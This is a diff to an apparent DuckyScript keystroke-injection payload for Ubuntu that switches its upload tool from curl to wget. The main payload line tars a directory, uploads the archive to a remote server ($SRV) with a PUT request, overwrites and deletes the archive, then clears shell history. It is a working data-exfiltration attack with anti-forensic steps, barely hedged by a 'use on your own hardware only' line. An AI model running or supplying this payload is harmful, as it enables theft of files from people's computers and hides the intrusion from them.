@@ -1,5 +1,5 @@
 REM Platform: Ubuntu (and most other GNOME distros)
-REM Description: Exfiltrate data via curl
+REM Description: Exfiltrate data via wget
 
 REM Use on your own hardware only.
 REM Written by Aranym
@@ -15,5 +15,5 @@ ENTER
 
 REM Main payload.
 
-STRING cd $DIR && tar --exclude=$NM -zcf $NM ./* && curl $SRV -T $NM && dd if=/dev/urandom of=$NM bs=100M count=1 && rm $NM && history -c; exit
+STRING cd $DIR && tar --exclude=$NM -zcf $NM ./* && wget -O - --method=PUT --body-file=$NM $SRV && dd if=/dev/urandom of=$NM bs=100M count=1 && rm $NM && history -c; exit
 ENTER
